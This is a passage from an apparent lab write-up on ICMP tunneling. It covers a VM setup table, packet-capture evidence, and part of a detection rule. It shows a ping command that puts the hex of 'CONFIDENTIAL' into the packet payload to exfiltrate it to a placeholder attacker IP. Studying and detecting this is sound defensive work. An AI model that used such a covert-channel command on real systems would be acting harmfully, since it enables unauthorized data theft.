...
| :--- | :--- | :--- | :--- |
| **Attacker / Sensor** | Kali Linux 2024.1 | `192.168.X.Y` | Wireshark, tcpdump |
| **Victim Endpoint** | Ubuntu Server 24.04 LTS | `192.168.X.Z` | `ping` (Native binary) |
| **Network Segment** | NAT Network (VMware VMnet8)| `192.168.X.0/24` | Promiscuous Mode Enabled |
...
The native `ping` binary of the victim's Linux OS was utilized. The `-p` (pattern) parameter was used to inject a hexadecimal data stream equivalent to the string `CONFIDENTIAL` (Hex: `434f4e464944454e4349414c`).

**Injection and exfiltration command:**
```bash
ping -c 1 -p 434f4e464944454e4349414c <ATTACKER_IP>
```
...
*(Figure 1: Legitimate ICMP packet showing the default Linux payload in the hexadecimal dump)*
...
The following screenshot shows how the Hex/ASCII dump of the altered packet reveals the injected pattern `...IDENTIALCONFIDENTIAL...`, proving the exfiltration tunnel in plaintext.

![ICMP Tunneling Evidence](images/02_inyected_payload.jpg)
*(Figure 2: Modified ICMP packet revealing the exfiltrated text string)*
...
* `content:"CONFIDENTIAL"`: Executes string matching directly on the payload, regardless of the underlying port.
